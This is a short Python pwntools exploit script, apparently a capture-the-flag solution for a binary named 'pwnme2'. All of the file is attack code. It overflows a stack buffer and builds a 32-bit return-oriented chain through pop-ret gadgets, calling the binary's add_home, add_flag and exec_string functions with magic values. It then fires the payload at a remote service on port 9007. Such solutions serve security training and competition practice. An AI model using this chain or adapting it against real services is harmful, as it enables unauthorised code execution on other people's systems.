#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

p_r_addr = 0x08048680
pp_r_addr = 0x0804867f

elf = ELF("./pwnme2")
add_home_addr = elf.symbols["add_home"]
add_flag_addr = elf.symbols["add_flag"]
exec_string_addr = elf.symbols["exec_string"]

payload = fit({0x6c + 0x4: [p32(add_home_addr), p32(p_r_addr), p32(0xdeadbeef), p32(add_flag_addr), p32(pp_r_addr), p32(0xcafebabe), p32(0xabadf00d), p32(exec_string_addr)]})

#  io = process("./pwnme2")
io = remote("10.4.21.55", 9007)
io.sendlineafter("Please input:\n", payload)
print io.recv()
io.close()


